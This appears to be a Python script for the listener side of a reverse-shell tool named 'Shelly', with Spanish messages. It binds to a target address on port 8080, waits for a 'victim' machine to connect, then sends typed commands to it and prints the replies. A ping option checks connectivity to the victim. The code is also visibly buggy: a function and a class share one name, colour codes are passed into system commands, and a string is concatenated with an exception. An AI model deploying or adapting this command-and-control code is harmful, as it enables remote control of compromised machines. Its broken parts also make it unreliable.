import socket, argparse, os
from colorama import Fore, Style
parser = argparse.ArgumentParser()
parser.add_argument('--target', '-t', help="Indica la IP objetivo")
parser.add_argument('--ping', '-p', help="Indica la IP a la que relizar el ping de verificación")
args = parser.parse_args()
def c():
    if os.name=="nt":os.system("cls")
    else:os.system("clear")
class c:
    R=Style.BRIGHT+Fore.RED
    W=Style.BRIGHT+Fore.WHITE
    R=Style.RESET_ALL+Fore.RESET
def p():
    c()
    t='''
███████╗██╗  ██╗███████╗██╗     ██╗  ██╗   ██╗
██╔════╝██║  ██║██╔════╝██║     ██║  ╚██╗ ██╔╝
███████╗███████║█████╗  ██║     ██║   ╚████╔╝ 
╚════██║██╔══██║██╔══╝  ██║     ██║    ╚██╔╝  
███████║██║  ██║███████╗███████╗███████╗██║   
╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  
'''
    print(c.R+t)

if args.ping:
    c()
    try:
        if os.name=="nt":os.system(c.R + f'ping -n 1 {args.ping}')
        else:os.system(c.R + f'ping -c 1 {args.ping}')
        c()
        p()
        print(c.R + '[*] Ping relizado con éxito, hay conectividad con la máquina víctima')
    
    except Exception as ex:
        c()
        p()
        print(c.R + '[*] No hay conectividad con la víctima. Error: ' + ex)

elif args.target:
    H=args.target
    P=8080
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((H,P))
    s.listen(1)
    p()
    print(c.W+f'[*] Escuchando conexiones en {H}:{P}')
    n,a=s.accept()
    print(c.W+f'[+] Conexión entrante: {a[0]}:{a[1]}')
    while True:
        e=input(c.W+f'shelly@{P}:~$ ')
        n.send(e.encode())
        if e.strip()=='exit':break
        o = n.recv(1024).decode()
        print(c.W+o)
    n.close()

else:
    c()
    p()
    print('[*] Error: No argument found')
